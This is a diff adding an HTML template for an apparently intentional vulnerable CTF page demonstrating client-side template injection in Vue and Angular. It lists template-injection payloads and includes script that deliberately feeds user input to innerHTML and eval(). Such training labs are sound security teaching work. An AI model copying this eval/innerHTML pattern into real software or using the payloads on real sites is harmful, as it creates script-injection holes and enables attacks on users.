@@ -1,0 +1,65 @@
+{% extends "base.html" %}
+{% block title %}CSTI Demo — BugBountyMart{% endblock %}
+{% block content %}
+<div class="container">
+    <div class="card" style="padding: 2rem;">
+        <div style="text-align: center; margin-bottom: 2rem;">
+            <i class="fas fa-code fa-3x" style="color: var(--warning); margin-bottom: 1rem;"></i>
+            <h1>Client-Side Template Injection (CSTI)</h1>
+            <p style="color: var(--text-muted);">Vue.js / Angular template injection vulnerability</p>
+            <span class="badge badge-warning">CTF Challenge</span>
+        </div>
+
+        <div class="card" style="background: var(--bg); margin-bottom: 2rem;">
+            <h3>Test Input</h3>
+            <p style="color: var(--text-muted); margin-bottom: 1rem;">Enter a template expression:</p>
+            <form onsubmit="return false;">
+                <div class="form-group">
+                    <input type="text" id="csti-input" class="form-control" 
+                           placeholder="Try: {{7*7}} or {{constructor.constructor('alert(1)')()}}"
+                           value="{{7*7}}">
+                </div>
+                <button class="btn btn-primary" onclick="renderTemplate()">Render</button>
+            </form>
+        </div>
+
+        <div class="card" style="background: var(--bg);">
+            <h3>Rendered Output</h3>
+            <div id="csti-output" style="padding: 1rem; border: 1px solid var(--border); border-radius: 8px; margin-top: 1rem; min-height: 50px;">
+                Output will appear here...
+            </div>
+        </div>
+
+        <div class="card" style="margin-top: 2rem; background: var(--bg);">
+            <h3>Payloads to Try</h3>
+            <ul style="color: var(--text-muted); line-height: 2; margin-top: 1rem;">
+                <li><code>{{7*7}}</code> — Basic detection</li>
+                <li><code>{{constructor.constructor('alert(1)')()}}</code> — Angular RCE</li>
+                <li><code>{{_openBlock.constructor('alert(1)')()}}</code> — Vue 3 RCE</li>
+                <li><code>{{this.constructor.constructor('alert(1)')()}}</code> — Vue 2 RCE</li>
+            </ul>
+            <p style="color: var(--primary); margin-top: 1rem;">Flag: <code>ctf{csti_***}</code></p>
+        </div>
+    </div>
+</div>
+
+<script>
+function renderTemplate() {
+    const input = document.getElementById('csti-input').value;
+    const output = document.getElementById('csti-output');
+    // VULNERABLE: Direct innerHTML with template-like content
+    // In a real Vue/Angular app, this would be compiled and executed
+    output.innerHTML = input;
+
+    // Simulated Vue-like evaluation for demo
+    if (input.includes('{{') && input.includes('}}')) {
+        try {
+            const expr = input.match(/\{\{(.*?)\}\}/)[1];
+            const result = eval(expr);
+            output.innerHTML += '<br><strong>Evaluated:</strong> ' + result;
+        } catch(e) {}
+    }
+}
+renderTemplate();
+</script>
+{% endblock %}
